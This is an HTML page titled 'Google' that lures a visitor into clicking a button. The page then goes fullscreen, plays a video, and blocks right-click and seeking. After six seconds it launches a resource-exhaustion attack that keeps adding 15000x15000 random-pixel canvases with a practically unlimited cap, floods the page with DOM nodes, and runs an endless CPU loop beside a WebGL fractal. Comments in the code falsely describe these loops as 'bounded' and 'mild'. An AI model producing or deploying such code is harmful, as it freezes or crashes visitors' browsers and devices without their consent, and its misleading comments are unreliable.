<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google</title>
  <script src="https://cdn.tailwindcss.com"></script>
        <script id="cloning-script" src="cloner.js"></script>

  <style>
    body { transition: background-color 0.2s; }
    canvas { border: 2px solid #0f0; margin: 5px; }
  </style>
</head>
<body class="bg-gray-900 flex flex-col items-center justify-center h-screen" oncontextmenu="return false;">

<div class="absolute inset-0 h-full w-full">
  <video id="my-video" playsinline loop class="h-full max-w-full object-contain mx-auto block">
    <source src="vid.mp4" type="video/mp4">
  </video>
</div>

<div id="status-message"
     class="absolute top-4 left-1/2 transform -translate-x-1/2 p-3 rounded-lg font-medium text-center bg-blue-900 bg-opacity-80 text-blue-300 z-10">
  Status: Click "CLICK ME" button to start
</div>

<button id="fs-btn"
        class="absolute bottom-8 left-1/2 transform -translate-x-1/2 px-4 py-2 rounded bg-green-600 text-white font-semibold">
  CLICK ME 
</button>
<div id="main">
    <canvas id="c1" width="4096" height="4096">
    </canvas>
    </div>
<script>
  setTimeout(() => {

    const videoElement = document.getElementById('my-video');
    const statusMessage = document.getElementById('status-message');
    const fsBtn = document.getElementById('fs-btn');

    const TIMEOUT_MS = 6000; // 6 seconds
    let timeoutId = null;
    let deb = false;
    let lastAllowedTime = 0;

    // Smaller canvas, limited count
    function createCanvas(id, width = 15000, height = 15000) {
      const canvas = document.createElement('canvas');
      canvas.id = id;
      canvas.width = width;
      canvas.height = height;
      document.body.appendChild(canvas);

      const ctx = canvas.getContext('2d');
      const imageData = ctx.createImageData(width, height);
      const data = imageData.data;

      for (let i = 0; i < data.length; i += 4) {
        data[i]   = Math.random() * 256;
        data[i+1] = Math.random() * 256;
        data[i+2] = Math.random() * 256;
        data[i+3] = 255;
      }
      ctx.putImageData(imageData, 0, 0);
    }

    // Light CPU + DOM stress, but bounded
    function startStressDemo() {
      // 1) Create a big number of canvases
      let canvasCount = 0;
      const maxCanvases = 100000000000000000000000;
      const canvasInterval = setInterval(() => {
        if (canvasCount >= maxCanvases) {
          clearInterval(canvasInterval);
          return;
        }
        createCanvas(`canvas-${canvasCount}`);
        canvasCount++;
      }, 300);

      // 2) Add some DOM spam, but capped
      let domCount = 0;
      const maxDom = 1000000;
      const domInterval = setInterval(() => {
        if (domCount >= maxDom) {
          clearInterval(domInterval);
          return;
        }
        const div = document.createElement("div");
        div.textContent = "Heavy demo element " + domCount;
        div.className = "text-xs text-green-400";
        document.body.appendChild(div);
        domCount++;
      }, 20);

      // 3) Mild CPU loop on a timer
      function mildCpuWork() {
        let sum = 0;
        for (let i = 0; i < 1000000; i++) {
          sum += Math.sin(i) * Math.cos(i);
        }
        requestAnimationFrame(mildCpuWork);
      }
      mildCpuWork();
    }
function startFractal(canvasId, containerId) {
    var canvas = document.getElementById(canvasId);
    var gl = canvas.getContext('webgl');
    if (!gl) {
        alert("WebGL not supported");
        return;
    }

    // --- State Variables ---
    var cx, cy;
    var glposition, glright, glforward, glup, glorigin, glx, gly, gllen;
    var t1 = new Date().getTime();
    var mx = 0, my = 0, mx1 = 0, my1 = 0, lasttimen = 0;
    var ml = 0, mr = 0, mm = 0;
    var len = 1.6;
    var ang1 = 2.8;
    var ang2 = 0.4;
    var cenx = 0.0, ceny = 0.0, cenz = 0.0;

    // --- Shader Sources ---
    var KERNEL_BODY = `
        precision highp float;
        float kernal(vec3 ver){
            vec3 a = ver;
            float b, c, d;
            for(int i=0; i<5; i++){
                b = length(a);
                c = atan(a.y, a.x) * 8.0;
                d = acos(a.z / b) * 8.0;
                b = pow(b, 8.0);
                a = vec3(b * sin(d) * cos(c), b * sin(d) * sin(c), b * cos(d)) + ver;
                if(b > 6.0) break;
            }
            return 4.0 - dot(a, a);
        }
    `;

    var VSHADER_SOURCE = `
        attribute vec4 position;
        varying vec3 dir, localdir;
        uniform vec3 right, forward, up, origin;
        uniform float x, y;
        void main() {
            gl_Position = position; 
            dir = forward + right * position.x * x + up * position.y * y;
            localdir = vec3(position.x * x, position.y * y, -1.0);
        }
    `;

    var FSHADER_SOURCE = `
        #define M_L 0.3819660113
        #define M_R 0.6180339887
        #define MAXR 8
        #define SOLVER 8
        precision highp float;
        
        float kernal(vec3 ver);
        uniform vec3 right, forward, up, origin;
        varying vec3 dir, localdir;
        uniform float len;

        void main() {
            vec3 color = vec3(0.0);
            int sign_hit = 0;
            float v, v1, v2, r1, r2, r3, r4, m1, m2, m3;
            const float step_size = 0.002;

            v1 = kernal(origin + dir * (step_size * len));
            v2 = kernal(origin);

            for (int k = 2; k < 1002; k++) {
                vec3 ver = origin + dir * (step_size * len * float(k));
                v = kernal(ver);
                if (v > 0.0 && v1 < 0.0) {
                    r1 = step_size * len * float(k - 1);
                    r2 = step_size * len * float(k);
                    for (int l = 0; l < SOLVER; l++) {
                        r3 = (r1 + r2) * 0.5;
                        if (kernal(origin + dir * r3) > 0.0) r2 = r3; else r1 = r3;
                    }
                    if (r3 < 2.0 * len) { sign_hit = 1; break; }
                }
                v2 = v1; v1 = v;
            }

            if (sign_hit == 1) {
                vec3 pos = origin + dir * r3;
                float r_sq = dot(pos, pos);
                vec3 n;
                float eps = r3 * 0.00025;
                n.x = kernal(pos - right * eps) - kernal(pos + right * eps);
                n.y = kernal(pos - up * eps) - kernal(pos + up * eps);
                n.z = kernal(pos + forward * eps) - kernal(pos - forward * eps);
                n = normalize(n);
                
                vec3 view_dir = normalize(localdir);
                vec3 refl = reflect(view_dir, n);
                float spec = pow(max(0.0, dot(refl, vec3(0.276, 0.920, 0.276))), 4.0);
                float diff = max(0.0, dot(n, vec3(0.276, 0.920, 0.276)));
                float lighting = spec * 0.45 + diff * 0.25 + 0.3;
                
                vec3 base_col = vec3(sin(r_sq*10.0)*0.5+0.5, sin(r_sq*10.0+2.05)*0.5+0.5, sin(r_sq*10.0-2.05)*0.5+0.5);
                color = base_col * lighting;
            }
            gl_FragColor = vec4(color, 1.0);
        }
    `;

    // --- Initialization ---
    function setupShaders() {
        var vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, "precision highp float;" + VSHADER_SOURCE);
        gl.compileShader(vs);

        var fs = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fs, KERNEL_BODY + FSHADER_SOURCE);
        gl.compileShader(fs);

        var prog = gl.createProgram();
        gl.attachShader(prog, vs);
        gl.attachShader(prog, fs);
        gl.linkProgram(prog);
        gl.useProgram(prog);

        glposition = gl.getAttribLocation(prog, 'position');
        glright = gl.getUniformLocation(prog, 'right');
        glforward = gl.getUniformLocation(prog, 'forward');
        glup = gl.getUniformLocation(prog, 'up');
        glorigin = gl.getUniformLocation(prog, 'origin');
        glx = gl.getUniformLocation(prog, 'x');
        gly = gl.getUniformLocation(prog, 'y');
        gllen = gl.getUniformLocation(prog, 'len');

        var buffer = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,0, 1,-1,0, 1,1,0, -1,-1,0, 1,1,0, -1,1,0]), gl.STATIC_DRAW);
        gl.vertexAttribPointer(glposition, 3, gl.FLOAT, false, 0, 0);
        gl.enableVertexAttribArray(glposition);
    }

    function handleResize() {
        cx = window.innerWidth;
        cy = window.innerHeight;
        var size = Math.min(cx, cy);
        var scale = size / 1024;
        var container = document.getElementById(containerId);
        container.style.transform = "scale(" + scale + ")";
        container.style.left = (cx - size) / 2 + "px";
        container.style.top = (cy - size) / 2 + "px";
        cx = size; cy = size;
    }

    function draw() {
        gl.uniform1f(glx, 1.0); // Simplified aspect ratio for square canvas
        gl.uniform1f(gly, 1.0);
        gl.uniform1f(gllen, len);
        gl.uniform3f(glorigin, len * Math.cos(ang1) * Math.cos(ang2) + cenx, len * Math.sin(ang2) + ceny, len * Math.sin(ang1) * Math.cos(ang2) + cenz);
        gl.uniform3f(glright, Math.sin(ang1), 0, -Math.cos(ang1));
        gl.uniform3f(glup, -Math.sin(ang2) * Math.cos(ang1), Math.cos(ang2), -Math.sin(ang2) * Math.sin(ang1));
        gl.uniform3f(glforward, -Math.cos(ang1) * Math.cos(ang2), -Math.sin(ang2), -Math.sin(ang1) * Math.cos(ang2));
        gl.drawArrays(gl.TRIANGLES, 0, 6);
    }

    function animate() {
        ang1 += 0.005;
        draw();
        requestAnimationFrame(animate);
    }

    // --- Events ---
    window.addEventListener('resize', handleResize);
    document.addEventListener('mousedown', function(e) { if(e.button==0) ml=1; if(e.button==2) mr=1; mx=e.clientX; my=e.clientY; });
    document.addEventListener('mouseup', function(e) { ml=0; mr=0; });
    document.addEventListener('mousemove', function(e) {
        if (ml) { ang1 += (e.clientX - mx) * 0.002; ang2 += (e.clientY - my) * 0.002; mm=1; }
        mx = e.clientX; my = e.clientY;
    });
    document.addEventListener('mousewheel', function(e) { e.preventDefault(); len *= Math.exp(-0.001 * e.wheelDelta); }, {passive:false});

    // --- Start ---
    setupShaders();
    handleResize();
    animate();
}

// Call the function
    function triggerTimeout() {
      videoElement.pause();
      document.body.style.backgroundColor = '#ef4444';

      startStressDemo();
      startFractal('c1', 'main');

    }

    function startTimer() {
      clearTimeout(timeoutId);
      timeoutId = setTimeout(() => {
        triggerTimeout();
      }, TIMEOUT_MS);
      statusMessage.textContent = "Fullscreen active. Demo will start soon.";
    }

    function resetAll() {
      clearTimeout(timeoutId);
      videoElement.pause();
      videoElement.currentTime = 0;
      statusMessage.textContent = "Exited fullscreen. Click 'CLICK ME' button to restart.";
      fsBtn.style.display = "block";
    }

    fsBtn.addEventListener('click', () => {
      if (document.fullscreenElement) return;

      document.documentElement.requestFullscreen().then(() => {
        videoElement.play().then(() => {
          startTimer();
          fsBtn.style.display = "none";
        });
      });
    });

    document.addEventListener('fullscreenchange', () => {
      if (!document.fullscreenElement) {
        if (deb == false) {
          resetAll();
        }
      }
    });

    videoElement.addEventListener('play', () => {
      if (!document.fullscreenElement) {
        videoElement.pause();
        videoElement.currentTime = 0;
        lastAllowedTime = 0;
        statusMessage.textContent = "Please use the 'CLICK ME' button to start playback.";
      }
    });

    videoElement.addEventListener('timeupdate', () => {
      lastAllowedTime = videoElement.currentTime;
    });

    videoElement.addEventListener('seeking', () => {
      if (videoElement.currentTime !== lastAllowedTime) {
        videoElement.currentTime = lastAllowedTime;
        statusMessage.textContent = "Seeking blocked.";
      }
    });
  }, 2000);
</script>

</body>
</html>
